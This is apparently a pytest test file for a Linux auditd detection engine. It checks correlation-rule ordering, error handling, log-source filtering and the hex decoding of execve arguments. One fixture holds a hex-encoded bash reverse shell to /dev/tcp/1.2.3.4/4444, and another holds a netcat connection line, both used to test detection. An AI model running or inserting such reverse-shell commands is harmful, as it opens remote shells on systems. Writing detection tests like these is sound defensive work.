from __future__ import annotations

from pathlib import Path

import pytest

from ayudas import cargar_reglas_desde_texto, coleccion_desde, evento_auditd
from detectionlab.fuentes import ErrorFuente, fuente_de
from detectionlab.motor import ErrorMotor, evaluar, ordenar_reglas
from detectionlab.normalizar import enriquecer
from detectionlab.reglas import ErrorReglas

_CADENA = """
title: A
id: 00000000-0000-4000-8000-00000000000a
name: a
logsource: {product: linux, service: auditd}
detection:
  sel: {data.audit.exe: '/bin/a'}
  condition: sel
---
title: C
id: 00000000-0000-4000-8000-00000000000c
name: c
correlation:
  type: temporal
  rules: [b, a]
  group-by: [agent.id]
  timespan: 1m
---
title: B
id: 00000000-0000-4000-8000-00000000000b
name: b
correlation:
  type: event_count
  rules: [a]
  group-by: [agent.id]
  timespan: 1m
  condition:
    gte: 2
"""


def test_orden_topologico_pone_las_dependencias_primero() -> None:
    orden = [regla.nombre for regla in ordenar_reglas(coleccion_desde(_CADENA))]
    assert orden.index("a") < orden.index("b") < orden.index("c")


def test_referencia_inexistente_es_error(tmp_path: Path) -> None:
    yaml = _CADENA.replace("rules: [b, a]", "rules: [b, zeta]")
    with pytest.raises(ErrorReglas, match="zeta"):
        cargar_reglas_desde_texto(yaml, tmp_path)
    sin_resolver = coleccion_desde(yaml, resolver=False)
    with pytest.raises(ErrorMotor, match="zeta"):
        ordenar_reglas(sin_resolver)


def test_ciclo_entre_correlaciones_es_error() -> None:
    yaml = _CADENA.replace("rules: [a]", "rules: [c]")
    with pytest.raises(ErrorMotor, match="ciclo"):
        ordenar_reglas(coleccion_desde(yaml, resolver=False))


def test_logsource_filtra_eventos_de_otra_fuente() -> None:
    coleccion = coleccion_desde(_CADENA)
    evento = evento_auditd(exe="/bin/a")
    ajeno = {**evento, "decoder": {"name": "sshd"}}
    assert "a" in evaluar(coleccion, [evento]).nombres_disparados()
    assert not evaluar(coleccion, [ajeno]).detecciones


def test_logsource_desconocido_es_error() -> None:
    with pytest.raises(ErrorFuente):
        fuente_de({"product": "windows", "service": "sysmon"})
    with pytest.raises(ErrorFuente):
        fuente_de({})


def test_enriquecer_decodifica_hex_y_arma_cmdline() -> None:
    evento = evento_auditd(
        exe="/usr/bin/bash",
        execve={
            "a0": "bash",
            "a1": "-c",
            "a2": "62617368202D69203E26202F6465762F7463702F312E322E332E342F3434343420303E2631",
        },
    )
    enriquecido = enriquecer(evento)
    execve = enriquecido["data"]["audit"]["execve"]
    assert execve["a2"] == "bash -i >& /dev/tcp/1.2.3.4/4444 0>&1"
    assert execve["cmdline"] == "bash -c bash -i >& /dev/tcp/1.2.3.4/4444 0>&1"
    assert evento["data"]["audit"]["execve"]["a2"].startswith("6261")


@pytest.mark.parametrize("valor", ["deadbeef", "1234", "4444", "5432", "6379", "2222", "c0ffee"])
def test_enriquecer_conserva_valores_que_parecen_hex_pero_no_lo_son(valor: str) -> None:
    evento = evento_auditd(exe="/usr/bin/nc", execve={"a0": "nc", "a1": "203.0.113.9", "a2": valor})
    execve = enriquecer(evento)["data"]["audit"]["execve"]
    assert execve["a2"] == valor
    assert execve["cmdline"] == f"nc 203.0.113.9 {valor}"


def test_enriquecer_decodifica_argumentos_con_comillas_o_no_ascii() -> None:
    evento = evento_auditd(
        exe="/usr/bin/echo",
        execve={"a0": "echo", "a1": b'"hola"'.hex().upper(), "a2": "año".encode().hex()},
    )
    execve = enriquecer(evento)["data"]["audit"]["execve"]
    assert execve["a1"] == '"hola"'
    assert execve["a2"] == "año"


def test_enriquecer_no_toca_eventos_sin_execve() -> None:
    evento = evento_auditd(exe="/usr/bin/rm", file={"name": "/var/log/auth.log"})
    assert enriquecer(evento) is evento
    assert enriquecer({"timestamp": "x"}) == {"timestamp": "x"}
